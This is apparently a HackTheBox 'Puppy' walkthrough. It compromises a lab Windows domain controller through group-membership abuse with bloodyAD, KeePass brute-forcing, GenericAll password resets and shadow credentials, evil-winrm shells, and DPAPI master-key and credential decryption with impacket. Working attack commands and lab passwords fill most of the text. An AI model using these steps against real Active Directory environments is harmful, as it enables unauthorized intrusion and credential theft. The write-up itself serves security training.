---
categories:
- Hackthebox
image:
  path: puppy.png
layout: post
media_subpath: /assets/images/puppy
tags:
- hackthebox
- writeup
- windows
- active-directory
- keepass
- bloodyad
- shadow-credentials
- dpapi
- ldap
- winrm
- medium
title: HTB - Puppy Walkthrough
---


## Introduction
Puppy is a medium-difficulty Windows domain controller that demonstrates several Active Directory attack techniques including group membership abuse, Keepass database cracking, Shadow Credentials, and DPAPI credential decryption. The attack path leverages BloodHound to identify privilege escalation paths and uses DPAPI to extract administrative credentials. For detailed DPAPI internals, refer to my [Voleur writeup](https://0xnullc0de.github.io/posts/voleur-hackthebox/#credential-access-via-dpapi).

## Reconnaissance
### Port Scanning
Initial `nmap` scan reveals a domain controller with standard AD services and NFS:

```
nmap -sCV -oA nmap/Puppy 10.129.232.75  
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-26 09:05 +0300
Nmap scan report for 10.129.232.75
Host is up (0.20s latency).
Not shown: 985 filtered tcp ports (no-response)
Bug in iscsi-info: no string output.
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-26 13:05:55Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3260/tcp open  iscsi?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m03s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-02-26T13:07:56
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 211.25 seconds
```

**Key Findings:**

- Domain: `PUPPY.HTB`
- Domain Controller: `dc.puppy.htb`
- WinRM enabled on port 5985
- NFS services running (port 111, 2049)

Add domain to hosts file:

```
echo '10.129.232.75  dc.puppy.htb puppy.htb dc' | sudo tee -a /etc/hosts
```

## Initial Access

### Provided Credentials

The box starts with credentials for `levi.james`:

- **Username**: `levi.james`
- **Password**: `KingofAkron2025!`


### SMB Enumeration

Enumerating SMB shares reveals a non-default share `DEV` that requires additional permissions:

```
nxc smb puppy.htb -u levi.james -p 'KingofAkron2025!' --shares 
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         10.129.232.75   445    DC               [*] Enumerated shares
SMB         10.129.232.75   445    DC               Share           Permissions     Remark
SMB         10.129.232.75   445    DC               -----           -----------     ------
SMB         10.129.232.75   445    DC               ADMIN$                          Remote Admin
SMB         10.129.232.75   445    DC               C$                              Default share
SMB         10.129.232.75   445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
SMB         10.129.232.75   445    DC               IPC$            READ            Remote IPC
SMB         10.129.232.75   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.232.75   445    DC               SYSVOL          READ            Logon server share 
```

Currently, `levi.james` does NOT have access to the `DEV` share.
### User Enumeration

Dumping domain users:

```
nxc smb puppy.htb -u levi.james -p 'KingofAkron2025!' --users                  
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         10.129.232.75   445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.232.75   445    DC               Administrator                 2025-02-19 19:33:28 0       Built-in account for administering the computer/domain 
SMB         10.129.232.75   445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.232.75   445    DC               krbtgt                        2025-02-19 11:46:15 0       Key Distribution Center Service Account 
SMB         10.129.232.75   445    DC               levi.james                    2025-02-19 12:10:56 0        
SMB         10.129.232.75   445    DC               ant.edwards                   2025-02-19 12:13:14 0        
SMB         10.129.232.75   445    DC               adam.silver                   2026-02-26 18:49:29 7        
SMB         10.129.232.75   445    DC               jamie.williams                2025-02-19 12:17:26 0        
SMB         10.129.232.75   445    DC               steph.cooper                  2025-02-19 12:21:00 0        
SMB         10.129.232.75   445    DC               steph.cooper_adm              2025-03-08 15:50:40 0        
SMB         10.129.232.75   445    DC               [*] Enumerated 9 local users: PUPPY
```

### BloodHound Analysis

Collecting Active Directory data:

```
bloodhound-python -d puppy.htb -u levi.james -p 'KingofAkron2025!' -c All --zip -ns 10.129.232.75
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
INFO: Done in 00M 37S
INFO: Compressing output into 20260226211420_bloodhound.zip
```


![img](Pasted image 20260226211849.png)

**BloodHound Findings:**

BloodHound revealed that `levi.james` is not currently in any privileged groups, but the `DEVELOPERS` group exists and has interesting permissions. However, `levi.james` is not a member

## Lateral Movement - Gaining Share Access

### Adding Self to DEVELOPERS Group

Since we have valid credentials, we can attempt to modify group memberships. Using `bloodyAD` to add ourselves to the `DEVELOPERS` group:

```
bloodyAD -d puppy.htb -u levi.james -p 'KingofAkron2025!' --host 10.129.232.75 add groupMember DEVELOPERS levi.james
[+] levi.james added to DEVELOPERS
```


**Technical Concept**: `bloodyAD` is a tool for Active Directory privilege escalation that can modify AD objects via LDAP. Adding ourselves to the DEVELOPERS group grants us the necessary permissions to access the DEV share.

### Verifying Share Access

Now that we're in the `DEVELOPERS` group, we can access the `DEV` share:

```
nxc smb puppy.htb -u levi.james -p 'KingofAkron2025!' --shares                                                      
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         10.129.232.75   445    DC               [*] Enumerated shares
SMB         10.129.232.75   445    DC               Share           Permissions     Remark
SMB         10.129.232.75   445    DC               -----           -----------     ------
SMB         10.129.232.75   445    DC               ADMIN$                          Remote Admin
SMB         10.129.232.75   445    DC               C$                              Default share
SMB         10.129.232.75   445    DC               DEV             READ            DEV-SHARE for PUPPY-DEVS
SMB         10.129.232.75   445    DC               IPC$            READ            Remote IPC
SMB         10.129.232.75   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.232.75   445    DC               SYSVOL          READ            Logon server share 

```

Success! We now have read access to the `DEV` share.


## Manual Enumeration - DEV Share Contents

### Exploring the Share

Connecting to the share with `impacket-smbclient`:

```
impacket-smbclient 'puppy.htb/levi.james:KingofAkron2025!'@10.129.232.75
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use DEV
ls
# ls
drw-rw-rw-          0  Sun Mar 23 10:07:57 2025 .
drw-rw-rw-          0  Sat Mar  8 19:52:57 2025 ..
-rw-rw-rw-   34394112  Sun Mar 23 10:09:12 2025 KeePassXC-2.7.9-Win64.msi
drw-rw-rw-          0  Sun Mar  9 23:16:16 2025 Projects
-rw-rw-rw-       2677  Wed Mar 12 05:25:46 2025 recovery.kdbx
```

I**nteresting Findings:**

- `KeePassXC-2.7.9-Win64.msi` - Keepass installer
- `recovery.kdbx` - Keepass database file

The presence of both a Keepass installer and a database file suggests password-stored credentials that might be useful.

### Downloading the Keepass Database

```
# get recovery.kdbx
# exit
```

Verifying the file type:

```
file recovery.kdbx 
recovery.kdbx: Keepass password database 2.x KDBX
```

## Keepass Database Cracking

### Initial Attempt with keepass2john

I find the file is password protected

![img](Pasted image 20260226213322.png)

I fail to get its hash

```
keepass2john recovery.kdbx                          
! recovery.kdbx : File version '40000' is currently not supported!
```

**Technical Note**: Keepass2john doesn't support newer Keepass database versions (format 40000). We need an alternative tool.

### Using bfkeepass

Using a Python-based brute-forcer that supports newer Keepass formats:

```
python3 bfkeepass.py -d ../smb/recovery.kdbx -w /usr/share/wordlists/rockyou.txt
[*] Running bfkeepass
[*] Starting bruteforce process...
[!] Success! Database password: liverpool
[*] Stopping bruteforce process.
[*] Done.
```

### Extracting Credentials

Opening the database with password `liverpool` reveals multiple credentials:

![img](Pasted image 20260226214722.png)

**Credentials Found:**

```
ant.edwards:Antman2025!
steph.cooper:ChefSteph2025!
jamie.williams:JWilliamstech2025!
```

Now that we have credentials for `ant.edwards`, we can run BloodHound again to see what new attack paths emerge:

![img](Pasted image 20260226222831.png)
**New BloodHound Findings:**

The analysis reveals that `ant.edwards` has `GenericAll` permissions on `adam.silver`.


### Technical Concept: GenericAll

**GenericAll** is one of the most powerful Active Directory permissions. It grants:

- Full control over the object
- Ability to modify any attribute
- Ability to change passwords
- Ability to add Shadow Credentials
- Ability to perform S4U2Self attacks

With GenericAll on `adam.silver`, we can:

1. Change the user's password
2. Add Shadow Credentials for PKINIT authentication
3. Modify group memberships
4. Reset the account if disabled

## Shadow Credentials Attempt on adam.silver

### First Attempt - Account Disabled

Attempting to add Shadow Credentials to `adam.silver`:

```
bloodyAD -d puppy.htb -u ant.edwards -p 'Antman2025!' --host 10.129.232.75 add genericAll adam.silver ant.edwards
[+] ant.edwards has now GenericAll on adam.silver



bloodyAD -d puppy.htb -u ant.edwards -p 'Antman2025!' --host 10.129.232.75 add shadowCredentials adam.silver                    
[+] KeyCredential generated with following sha256 of RSA key: a62cccf30c355df560da7a7d1c1c84a4969937816c6c9b122d0383dbb2741e6d
No outfile path was provided. The certificate(s) will be stored with the filename: WOcHqdP9
[+] Saved PEM certificate at path: WOcHqdP9_cert.pem
[+] Saved PEM private key at path: WOcHqdP9_priv.pem
A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
Run the following command to obtain a TGT:
python3 PKINITtools/gettgtpkinit.py -cert-pem WOcHqdP9_cert.pem -key-pem WOcHqdP9_priv.pem puppy.htb/adam.silver WOcHqdP9.ccache
```

Getting TGT with PKINIT fails:


```
python3 PKINITtools/gettgtpkinit.py -cert-pem WOcHqdP9_cert.pem -key-pem WOcHqdP9_priv.pem puppy.htb/adam.silver WOcHqdP9.ccache
2026-02-26 22:57:34,155 minikerberos INFO     Loading certificate and key from file
2026-02-26 22:57:34,168 minikerberos INFO     Requesting TGT
Traceback (most recent call last):
  File "/home/d4rkc0de/LABS/HTB/Season8/Puppy/files/PKINITtools/gettgtpkinit.py", line 349, in <module>
    main()
    ~~~~^^
  File "/home/d4rkc0de/LABS/HTB/Season8/Puppy/files/PKINITtools/gettgtpkinit.py", line 345, in main
    amain(args)
    ~~~~~^^^^^^
  File "/home/d4rkc0de/LABS/HTB/Season8/Puppy/files/PKINITtools/gettgtpkinit.py", line 315, in amain
    res = sock.sendrecv(req)
  File "/home/d4rkc0de/LABS/HTB/Season8/Puppy/files/PKINITtools/.env/lib/python3.13/site-packages/minikerberos/network/clientsocket.py", line 85, in sendrecv
    raise KerberosError(krb_message)
minikerberos.protocol.errors.KerberosError:  Error Name: KDC_ERR_CLIENT_REVOKED Detail: "Client’s credentials have been revoked" 
```

**Technical Concept: KDC_ERR_CLIENT_REVOKED**  
This error indicates the target account is disabled. The KDC rejects authentication attempts for disabled accounts regardless of the authentication method.

### Confirming Account Status

Changing password and testing authentication:

```
bloodyAD -d puppy.htb -u ant.edwards -p 'Antman2025!' --host 10.129.232.75 set password adam.silver 'Pass!@#'                   
[+] Password changed successfully!
```

```
nxc smb puppy.htb -u adam.silver -p 'Pass!@#'
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\adam.silver:Pass!@# STATUS_ACCOUNT_DISABLED 
```


### Enabling the Account

Removing the `ACCOUNTDISABLE` flag:

```
bloodyAD -d puppy.htb -u ant.edwards -p 'Antman2025!' --host 10.129.232.75 remove uac adam.silver -f ACCOUNTDISABLE             
[-] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl
```

**Technical Concept: userAccountControl**  
The `userAccountControl` attribute is a bitmask that controls various account settings:

- `0x0002` = ACCOUNTDISABLE
- `0x0020` = PASSWD_NOTREQD
- `0x10000` = DONT_EXPIRE_PASSWORD
- `0x200000` = DONT_REQ_PREAUTH

### Second Attempt - PKINIT Not Supported

After enabling the account, Shadow Credentials succeed but PKINIT fails differently:

```
bloodyAD -d puppy.htb -u ant.edwards -p 'Antman2025!' --host 10.129.232.75 add shadowCredentials adam.silver                    
[+] KeyCredential generated with following sha256 of RSA key: 29b89688af5d3136d8e3aa6f7f8dc17192881373a9bb42eb6ee1d0c2163f9886
No outfile path was provided. The certificate(s) will be stored with the filename: vUaIycK2
[+] Saved PEM certificate at path: vUaIycK2_cert.pem
[+] Saved PEM private key at path: vUaIycK2_priv.pem
A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
Run the following command to obtain a TGT:
python3 PKINITtools/gettgtpkinit.py -cert-pem vUaIycK2_cert.pem -key-pem vUaIycK2_priv.pem puppy.htb/adam.silver vUaIycK2.ccache


bloodyAD -d puppy.htb -u ant.edwards -p 'Antman2025!' --host 10.129.232.75 remove uac adam.silver -f ACCOUNTDISABLE      


python3 PKINITtools/gettgtpkinit.py -cert-pem vUaIycK2_cert.pem -key-pem vUaIycK2_priv.pem puppy.htb/adam.silver vUaIycK2.ccache
2026-02-26 23:06:47,151 minikerberos INFO     Loading certificate and key from file
2026-02-26 23:06:47,164 minikerberos INFO     Requesting TGT
Traceback (most recent call last):
  File "/home/d4rkc0de/LABS/HTB/Season8/Puppy/files/PKINITtools/gettgtpkinit.py", line 349, in <module>
    main()
    ~~~~^^
  File "/home/d4rkc0de/LABS/HTB/Season8/Puppy/files/PKINITtools/gettgtpkinit.py", line 345, in main
    amain(args)
    ~~~~~^^^^^^
  File "/home/d4rkc0de/LABS/HTB/Season8/Puppy/files/PKINITtools/gettgtpkinit.py", line 315, in amain
    res = sock.sendrecv(req)
  File "/home/d4rkc0de/LABS/HTB/Season8/Puppy/files/PKINITtools/.env/lib/python3.13/site-packages/minikerberos/network/clientsocket.py", line 85, in sendrecv
    raise KerberosError(krb_message)
minikerberos.protocol.errors.KerberosError:  Error Name: KDC_ERR_PADATA_TYPE_NOSUPP Detail: "KDC has no support for PADATA type (pre-authentication data)" 
```

**Technical Concept: KDC_ERR_PADATA_TYPE_NOSUPP**  
This error indicates the Domain Controller does not support PKINIT (Kerberos authentication with certificates). Some AD environments disable certificate-based authentication.

### Fallback - Password Change

Since PKINIT isn't supported, we fall back to traditional password change (which we already did) and standard Kerberos authentication:
So I just change his password

```
impacket-getTGT 'puppy.htb/adam.silver:Pass!@#'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in adam.silver.ccache
```
## Access as adam.silver

adam.silver is part of remote management users

![img](Pasted image 20260226231503.png)

### Configuring Kerberos

```
nxc smb puppy.htb --use-kcache --generate-krb5-file krb5.conf      
SMB         puppy.htb       445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         puppy.htb       445    DC               [+] krb5 conf saved to: krb5.conf
SMB         puppy.htb       445    DC               [+] Run the following command to use the conf file: export KRB5_CONFIG=krb5.conf
SMB         puppy.htb       445    DC               [+] PUPPY.HTB\adam.silver from ccache 


export KRB5_CONFIG=krb5.conf
```

### WinRM Access

```
evil-winrm -i dc.puppy.htb -r puppy.htb -K adam.silver.ccache
                                        
Evil-WinRM shell v3.9
                                        
Warning: KRB5CCNAME is already set to: adam.silver.ccache. Using existing value instead of /home/d4rkc0de/LABS/HTB/Season8/Puppy/files/adam.silver.ccache
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\adam.silver\Documents> 
```

**User flag**: `C:\Users\adam.silver\Desktop\user.txt`

## Privilege Escalation

### Discovery of Backup Files

Exploring the system reveals a backup directory at the root of C

```
*Evil-WinRM* PS C:\> cd Backups
*Evil-WinRM* PS C:\Backups> dir

    Directory: C:\Backups
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip
```

Downloading the backup:

```
*Evil-WinRM* PS C:\Backups> download site-backup-2024-12-30.zip
```

### Extracting LDAP Credentials

Unzipping and examining contents reveals an LDAP configuration file:

```
cat puppy/nms-auth-config.xml.bak                          
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>
                                                
```

**New Credentials**: `steph.cooper:ChefSteph2025!`

### Access as steph.cooper

Checking if `steph.cooper` has WinRM access (from BloodHound, we know they're in `Remote Management Users`):

```
evil-winrm -i puppy.htb -u steph.cooper -p 'ChefSteph2025!'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\steph.cooper\Documents> 
```
### Privilege Check

```
*Evil-WinRM* PS C:\Users\steph.cooper\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\steph.cooper\Documents>
```


## DPAPI Credential Extraction

### Technical Concept: DPAPI

**Windows Data Protection API (DPAPI)** is used to securely store sensitive data like passwords, certificates, and browser credentials. For a comprehensive explanation of DPAPI internals, master key protection, and decryption techniques, refer to my [Voleur writeup](https://0xnullc0de.github.io/posts/voleur-hackthebox/#credential-access-via-dpapi).

**Key Points:**

- Master keys are encrypted with the user's password hash
- Each user has a master key in `%APPDATA%\Microsoft\Protect\{SID}`
- Credential files are encrypted with the master key
- With the user's password and the master key file, we can decrypt any DPAPI-protected dat    

### Locating DPAPI Artifacts

**Master Key Location:**

```
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> gci -force
-a-hs-          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407
-a-hs-         2/23/2025   2:36 PM             24 Preferred
```


**Credential File Location:**

```
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials> gci
-a----          3/8/2025   7:54 AM            982 C8D69EBE9A43E9DEBF6B5FBD48B521B9
```

### Extracting DPAPI Files

Base64 encoding for transfer:

**Master Key:**

```
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407"))
AgAAAAAAAAAAAAAANQA1ADYAYQAyADQAMQAyAC0AMQAyADcANQAtADQAYwBjAGYALQBiADcAMgAxAC0AZQA2AGEAMABiADQAZgA5ADAANAAwADcAAABqVXUSz0wAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAAsj8xITRBgEgAZOArghULmlBGAAAJgAAAA2YAAPtTG5NorNzxhcfx4/jYgxj+JK0HBHMu8jL7YmpQvLiX7P3r8JgmUe6u9jRlDDjMOHDoZvKzrgIlOUbC0tm4g/4fwFIfMWBq0/fLkFUoEUWvl1/BQlIKAYfIoVXIhNRtc+KnqjXV7w+BAgAAAIIHeThOAhE+Lw/NTnPdszJQRgAACYAAAANmAAAnsQrcWYkrgMd0xLdAjCF9uEuKC2mzsDC0a8AOxgQxR93gmJxhUmVWDQ3j7+LCRX6JWd1L/NlzkmxDehild6MtoO3nd90f5dACAAAAAAEAAFgAAADzFsU+FoA2QrrPuakOpQmSSMbe5Djd8l+4J8uoHSit4+e1BHJIbO28uwtyRxl2Q7tk6e/jjlqROSxDoQUHc37jjVtn4SVdouDfm52kzZT2VheO6A0DqjDlEB19Qbzn9BTpGG4y7P8GuGyN81sbNoLN84yWe1mA15CSZPHx8frov6YwdLQEg7H8vyv9ZieGhBRwvpvp4gTur0SWGamc7WN590w8Vp98J1n3t3TF8H2otXCjnpM9m6exMiTfWpTWfN9FFiL2aC7Gzr/FamzlMQ5E5QAnk63b2T/dMJnp5oIU8cDPq+RCVRSxcdAgUOAZMxPs9Cc7BUD+ERVTMUi/Jp7MlVgK1cIeipAl/gZz5asyOJnbThLa2ylLAf0vaWZGPFQWaIRfc8ni2iVkUlgCO7bI9YDIwDyTGQw0Yz/vRE/EJvtB4bCJdW+Ecnk8TUbok3SGQoExL3I5Tm2a/F6/oscc9YlciWKEmqQ=
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> 
```

**Credential File:**

```
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials> [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9"))
AQAAAJIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAEiRqVXUSz0y3IeagtPkEBwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAAHEb7RgOmv+9Na4Okf93s5UAAAAABIAAAKAAAAAQAAAACtD/ejPwVzLZOMdWJSHNcNAAAAAxXrMDYlY3P7k8AxWLBmmyKBrAVVGhfnfVrkzLQu2ABNeu0R62bEFJ0CdfcBONlj8Jg2mtcVXXWuYPSiVDse/sOudQSf3ZGmYhCz21A8c6JCGLjWuS78fQnyLW5RVLLzZp2+6gEcSU1EsxFdHCp9cT1fHIHl0cXbIvGtfUdeIcxPq/nN5PY8TR3T8i7rw1h5fEzlCX7IFzIu0avyGPnrIDNgButIkHWX+xjrzWKXGEiGrMkbgiRvfdwFxb/XrET9Op8oGxLkI6Mr8QmFZbjS41FAAAADqxkFzw7vbQSYX1LftJiaf2waSc
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials>
```

### Decrypting Master Key

Using `impacket-dpapi` with the user's password:

```
impacket-dpapi masterkey -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -file masterkey -password 'ChefSteph2025!' 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

### Decrypting Credential File

Using the decrypted master key:

```
impacket-dpapi credential -file credential -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description : 
Unknown     : 
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

**New Credentials**: `steph.cooper_adm:FivethChipOnItsWay2025!`

## Domain Admin Access

### Verifying WinRM Access

```
nxc winrm puppy.htb -u steph.cooper_adm -p 'FivethChipOnItsWay2025!'
WINRM       10.129.232.75   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.232.75   5985   DC               [+] PUPPY.HTB\steph.cooper_adm:FivethChipOnItsWay2025! (Pwn3d!)
```

**Note**: The `(Pwn3d!)` flag indicates this user has administrative privileges.

### Final Shell

```
evil-winrm -i puppy.htb -u steph.cooper_adm -p 'FivethChipOnItsWay2025!'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\steph.cooper_adm\Documents>
```

**Root flag**: `C:\Users\Administrator\Desktop\root.txt`



